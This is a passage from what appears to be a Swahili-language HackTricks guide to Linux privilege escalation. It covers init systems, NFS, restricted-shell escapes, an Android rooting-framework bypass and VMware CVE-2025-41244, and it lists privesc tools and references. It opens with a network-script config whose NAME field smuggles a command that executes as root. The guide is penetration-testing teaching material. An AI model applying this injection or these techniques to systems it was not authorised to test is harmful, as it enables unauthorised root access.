Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Zingatia nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Saraka ya `/etc/init.d` ina **scripts** za System V init (SysVinit), **mfumo wa kawaida wa zamani wa kudhibiti huduma za Linux**. Ina scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zilizo kwenye `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **kudhibiti huduma** ulioletwa na Ubuntu, unaotumia faili za usanidi kusimamia huduma. Licha ya mabadiliko kwenda Upstart, scripts za SysVinit bado hutumiwa pamoja na usanidi wa Upstart kutokana na safu ya uoanifu ya Upstart.

**systemd** ni mfumo wa kisasa wa uanzishaji na usimamizi wa huduma, wenye vipengele vya kina kama vile kuwasha daemon inapohitajika, usimamizi wa automount, na snapshots za hali ya mfumo. Hupanga faili kwenye `/usr/lib/systemd/` kwa vifurushi vya usambazaji na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, na kurahisisha mchakato wa usimamizi wa mfumo.<sup>[[21]](#references)</sup>

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoroka kutoka kwa Shell zilizowekewa vizuizi


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: matumizi mabaya ya manager-channel

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua utendaji wa kernel wenye mamlaka kwa manager ya userspace. Uthibitishaji dhaifu wa manager (kwa mfano, ukaguzi wa saini unaotegemea mpangilio wa FD au mifumo dhaifu ya nenosiri) unaweza kuwezesha app ya ndani kujifanya manager na kupata root kwenye vifaa ambavyo tayari vime-rootiwa. Pata maelezo zaidi na jinsi ya kutumia udhaifu huu hapa:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Ugunduzi wa huduma ya VMware Tools LPE (CWE-426) kupitia exec inayotumia regex (CVE-2025-41244)

Ugunduzi wa huduma unaoendeshwa na regex katika VMware Tools/Aria Operations unaweza kupata njia ya binary kutoka kwenye mistari ya amri ya michakato na kuiendesha kwa -v katika muktadha wenye mamlaka. Miundo ya ruhusa pana (kwa mfano, kutumia \S) inaweza kulinganisha listeners zilizowekwa na mshambuliaji katika maeneo yanayoweza kuandikwa (kwa mfano, /tmp/httpd), na kusababisha utekelezaji kama root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Pata maelezo zaidi na uone muundo wa jumla unaoweza kutumika kwa mifumo mingine ya ugunduzi/ufuatiliaji hapa:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kinga za Usalama za Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana za Linux/Unix Privesc

### **Zana bora ya kutafuta njia za Linux local privilege escalation:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(chaguo la -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha udhaifu wa kernel katika Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyiko wa scripts zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (kupanda kwa mamlaka kupitia Crontab UI, kutumia tena vitambulisho vya zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload ya .text_sig iliyoghushiwa kwa monitor inayoendeshwa na cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: kupita Neighborhood Watch (kuteka PATH kupitia sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Kupanda kwa Mamlaka kwenye Linux kwa Msingi](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Mwongozo wa Kupanda kwa Mamlaka kwenye Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Shambulia na Jilinde: Mbinu za Kupanda kwa Mamlaka kwenye Linux za 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Hakuna anayetarajia utekelezaji wa amri!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Kupanda kwa Mamlaka kwenye Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Mwongozo wa Mazoezi ya Maabara - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Vidokezo na Mbinu za Kupanda kwa Mamlaka kwenye Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Zana ya kuorodhesha Linux na Kupanda kwa Mamlaka](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket ni nini?](https://www.linux.com/news/what-socket/)
- [15] [Maelezo ya Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Tumia D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Kupanda kwa Mamlaka kwenye Linux kupitia SUID Executables](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Sehemu ya 2 – Kupanda kwa Mamlaka kwenye Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jinsi ya kusimamia ACL kwenye Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Kupata root kupitia network-scripts kwenye Redhat/CentOS](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd ni nini?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection kupitia logs, msururu mzima)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Mwongozo wa GNU Bash – BASH_ENV (faili ya uanzishaji isiyoingiliana)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (nakala ya cron ya pg_basebackup → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Ukiitaja tu, VMware huiinua (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Kupanda kwa Haki kupitia Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Udhaifu wa sudo wa kupanda kwa haki CVE-2025-32462 na CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Saraka za Hifadhi za PYC](https://peps.python.org/pep-3147/)
- [32] [Nyaraka za Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [Suala #74 la polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet ya @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Kurekodi Nywila kwenye Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Maelezo ya Hali ya Mashindano ya logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
